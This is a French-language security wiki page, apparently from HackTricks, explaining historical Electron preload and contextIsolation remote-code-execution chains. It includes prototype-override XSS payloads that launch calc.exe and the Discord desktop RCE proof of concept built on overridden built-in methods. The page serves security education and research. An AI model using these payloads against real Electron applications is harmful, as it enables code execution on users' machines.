# Electron contextIsolation RCE via preload code

{{#include ../../banners/hacktricks-training.md}}

Il s’agit de **chaînes d’exploitation historiques** dans lesquelles le code preload partageait des intrinsèques JavaScript ou des API privilégiées avec du contenu renderer contrôlé par un attaquant. Lorsque l’isolation des contextes est activée, le preload et la page utilisent normalement des environnements JavaScript distincts ; les redéfinitions de prototypes dans la page n’affectent donc pas automatiquement les objets du preload. Vérifiez la chaîne d’exploitation avec la version exacte d’Electron/de l’application et l’implémentation du bridge.<sup>[[3]](#references)</sup>

## Exemple 1

Exemple tiré de [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)<sup>[[1]](#references)</sup>

Ce code ouvre les liens http(s) avec le navigateur par défaut :

![Electron contextIsolation RCE via preload code - Exemple 1 : Ce code ouvre les liens http(s) avec le navigateur par défaut](<../../images/image (768).png>)

Dans l’application historique concernée, une navigation vers un fichier local, telle que `file:///C:/Windows/System32/calc.exe`, pouvait atteindre un mécanisme de lancement du système d’exploitation ; `SAFE_PROTOCOLS.indexOf` était censé l’empêcher.

Un attaquant pouvait donc injecter ce code JS via une XSS ou une navigation arbitraire de la page :

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

Comme l'appel à `SAFE_PROTOCOLS.indexOf` renverra toujours 1337, l'attaquant peut contourner la protection et exécuter calc. Exploit final :

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

Vérifiez les diapositives originales pour trouver d’autres moyens d’exécuter des programmes sans qu’une invite demande des autorisations.<sup>[[1]](#references)</sup>

L’ancienne chaîne Discord envisageait également le chargement de `file://127.0.0.1/electron/rce.jar` au format UNC comme une autre voie d’exécution possible ; vérifiez si elle est accessible sur la version exacte de Windows/Electron.<sup>[[2]](#references)</sup>

## Example 2: Discord App RCE

Exemple tiré de [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)<sup>[[2]](#references)</sup>

En examinant les scripts preload, j’ai découvert que Discord expose la fonction qui permet d’appeler certains modules autorisés via `DiscordNative.nativeModules.requireModule('MODULE-NAME')` dans la page web.\
Ici, je ne pouvais pas utiliser directement des modules permettant de réaliser une RCE, comme le module _child_process_, mais j’ai **trouvé du code permettant de réaliser une RCE en remplaçant les méthodes JavaScript intégrées** et en interférant avec l’exécution du module exposé.

Voici le PoC. J’ai pu confirmer que l’application **calc** s’**ouvre** lorsque j’a**ppelle la fonction `getGPUDriverVersions`**, définie dans le module nommé « _discord_utils_ », depuis devTools, tout en **remplaçant `RegExp.prototype.test` et `Array.prototype.join`**.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

La fonction `getGPUDriverVersions` tente d’exécuter le programme à l’aide de la bibliothèque "_execa_", comme suit :

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

Habituellement, _execa_ tente d’exécuter "_nvidia-smi.exe_", indiqué dans la variable `nvidiaSmiPath`. Cependant, en raison de la surcharge de `RegExp.prototype.test` et de `Array.prototype.join`, **l’argument est remplacé par "**_**calc**_**" lors du traitement interne d’_execa**_**.

Plus précisément, l’argument est remplacé en influençant les chemins de résolution de commande et de traitement des arguments dans l’analyseur historique de `cross-spawn`.<sup>[[4]](#references)</sup>

## References

- [1] [Electron : Abuser de l’absence d’isolation du contexte - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [RCE dans l’application de bureau Discord](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — Isolation du contexte](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [Révision de l’analyseur `node-cross-spawn` et chemins exacts utilisés par la chaîne (lignes 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
